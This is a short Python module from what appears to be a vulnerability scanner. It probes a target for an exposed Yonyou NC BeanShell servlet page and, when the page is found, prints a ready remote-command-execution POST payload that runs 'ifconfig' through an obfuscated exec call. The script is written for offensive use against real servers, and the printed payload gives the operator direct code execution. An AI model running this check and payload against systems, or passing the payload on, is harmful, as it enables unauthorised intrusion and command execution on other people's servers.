import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def nc_beanshell_rce(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    url = urldata + '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers)
        if response.status_code == 200 and 'BeanShell' in response.text:
            print(Vcolors.RED + "[+] BeanShell页面存在, 可能存在漏洞: {}".format(url) +Vcolors.ENDC)
            print(Vcolors.RED +'[+] 改漏洞使用方式POST请求：bsh.script=ex\u0065c("ifconfig");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\n' +Vcolors.ENDC)
            return url
        else:
            print(Vcolors.WARNING + "[x] BeanShell页面漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("nc_beanshell_rce脚本出现异常")



